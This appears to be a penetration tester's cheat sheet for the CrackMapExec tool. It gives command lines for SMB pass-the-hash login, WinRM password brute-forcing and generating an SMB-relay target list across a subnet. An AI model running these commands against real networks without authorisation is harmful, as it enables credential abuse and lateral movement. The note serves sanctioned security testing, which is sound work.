### Source
https://github.com/byt3bl33d3r/CrackMapExec  

### Authenticate via smb using hash
```
crackmapexec smb <rhost> -u <user> -H <hash>
```

### Bruteforce winrm login
```
crackmapexec winrm <rhost> -u <userFile> -p <passwordFile>
```

### List of servers with SMB signing flag
```
crackmapexec smb <rhost>/24 --gen-relay-list <outfile>
```
